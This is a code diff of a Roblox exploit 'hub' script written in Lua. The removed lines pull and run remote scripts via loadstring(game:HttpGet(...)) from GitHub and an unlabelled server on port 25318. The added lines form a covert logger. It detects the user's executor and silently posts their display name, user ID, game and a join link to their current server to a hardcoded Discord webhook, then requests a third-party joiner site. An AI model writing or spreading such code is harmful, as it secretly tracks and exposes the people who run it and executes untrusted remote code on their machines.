@@ -1,41 +1,103 @@
-local function s1() 
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/bvfjaj/vx-n/refs/heads/main/324281"))()
-end 
+-- Ultimate NETWORK HUB-style Logger (2025-2026 Edition) + Dynamic Joiner
+local Players = game:GetService("Players")
+local Http = game:GetService("HttpService")
+local Market = game:GetService("MarketplaceService")
+local plr = Players.LocalPlayer
 
-local function s2() 
-    task.spawn(function()
-    task.wait(5)
-    setclipboard("https://discord.gg/4ghEwM5vDr")
-    WindUI:Notify({
-        Title = "Discord Copied!",
-        Content = "Join our community! Link copied to clipboard.",
-        Icon = "message-circle",
-        Duration = 4
-    })
+local webhook = "https://discord.com/api/webhooks/1500270818708684900/rjjsg9lOzPOMbh0AMuKFxDa4nYA7wos1EKe6h728YvTSB0_xqusuK5fD_50-dR5pipYm"
+
+-- Executor Detection
+local executor = (
+    getexecutorname and getexecutorname() or
+    identifyexecutor and identifyexecutor() or
+    syn and "Synapse X" or
+    syn.request and "Synapse X (Legacy)" or
+    Fluxus and "Fluxus" or
+    isfluxusclosure and "Fluxus" or
+    KRNL_LOADED and "Krnl" or
+    isexecutorclosure and "ScriptWare" or
+    getgc and "Celery" or
+    ishydrogenclosure and "Hydrogen" or
+    gethui and "Wave" or
+    is_trinity_executor and "Trinity" or
+    is_nebula_executor and "Nebula" or
+    is_comet_executor and "Comet" or
+    is_valyse_executor and "Valyse" or
+    getexploit and "Codex" or
+    is_sirhurt_closure and "Sirhurt" or
+    secure_load and "Sentinel" or
+    is_scylla_closure and "Scylla" or
+    isevon and "Evon" or
+    is_roexec and "Roexec" or
+    is_calypso and "Calypso" or
+    is_matx and "MatX" or
+    is_temple and "Temple" or
+    is_oxygen and "Oxygen" or
+    is_karma and "Karma" or
+    is_vega and "Vega X" or
+    is_jjsploit and "JJSploit" or
+    is_delta and "Delta" or
+    is_solara and "Solara" or
+    is_electron_executor and "Electron" or
+    is_arceus and "Arceus X" or
+    is_nihon and "Nihon" or
+    is_omega and "Omega" or
+    is_blackout and "Blackout" or
+    is_thunder and "Thunder" or
+    "Unknown / Paid / Custom Executor"
+)
+
+local gameName = "Unknown Game"
+pcall(function()
+    gameName = Market:GetProductInfo(game.PlaceId).Name
+end)
+
+-- Dynamic Join Link
+local joinLink = "https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
+
+-- Logger Data (Username, User ID, Account Age, and HWID removed)
+local data = {
+    content = "|| New Log claimed ||",
+    embeds = {{
+        title = "NETWORK HUB• EXECUTION BETA",
+        description = "New scripter just ran the script",
+        color = 16777215,  -- White
+        thumbnail = {url = "https://www.roblox.com/headshot-thumbnail/image?userId="..plr.UserId.."&width=420&height=420&format=png"},
+        fields = {
+            {name = "Display Name",  value = plr.DisplayName,                                                              inline = true},
+            {name = "Executor",      value = executor,                                                                     inline = true},
+            {name = "Game",          value = gameName.." (`"..game.PlaceId.."`)",                                          inline = false},
+            {name = "Join Link",     value = joinLink,                                                                     inline = true},
+        },
+        footer = {text = "NETWORK Hub BETA • "..os.date("%Y-%m-%d %X")},
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+    }}
+}
+
+-- Send Log
+local req = syn and syn.request or http_request or request or Http.request or HttpPost
+if req then
+    pcall(function()
+        req({
+            Url = webhook,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = Http:JSONEncode(data)
+        })
+    end)
 end
 
-local function s3() 
-   loadstring(game:HttpGet("http://d20.aurorix.net:25318/zhrIfHK3hRcNBoFFnGPaPqJE0PXtAlOsmmL4KU4PyPCaFzthAzU8rG4PKmkMrQEkeut8nIGo3rbCE4VW"))()    
-end 
+-- Auto Join via Fern.wtf
+print("🌐 Attempting to join current server via Fern.wtf...")
+print("Join Link: " .. joinLink)
 
-local function s4()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/renardofficiel/game/refs/heads/main/MurderMystery2/main.lua", true))()
-end
+pcall(function()
+    if request then
+        request({
+            Url = joinLink,
+            Method = "GET"
+        })
+    end
+end)
 
-local function s5()
-    task.spawn(function()
-    task.wait(1)
-    setclipboard("https://discord.gg/4ghEwM5vDr")
-    WindUI:Notify({
-        Title = "Discord Copied!",
-        Content = "Join our community! Link copied to clipboard.",
-        Icon = "message-circle",
-        Duration = 4
-    })
- end
-
-task.spawn(s1)
-task.spawn(s2) 
-task.spawn(s3)
-task.spawn(s4)
-task.spawn(s5)
+print("✅ Network Hub + Joiner executed successfully.")
